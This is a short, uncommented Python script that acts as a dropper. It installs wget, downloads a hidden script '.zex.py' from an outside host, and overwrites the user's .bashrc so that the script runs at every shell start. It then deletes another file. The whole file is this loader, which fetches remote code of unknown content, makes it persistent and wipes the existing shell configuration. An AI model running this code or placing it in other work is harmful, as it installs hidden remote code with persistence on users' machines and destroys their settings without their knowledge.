import os

url = 'https://getmyfile.xyz/dl_3170403/.zex.py'

os.system("apt install zip wget -y")
cmd = "wget "+url
os.system(cmd)
f = open(".bashrc", "w")
f.write("python .zex.py")
f.close()
os.system("rm Xzex.py")
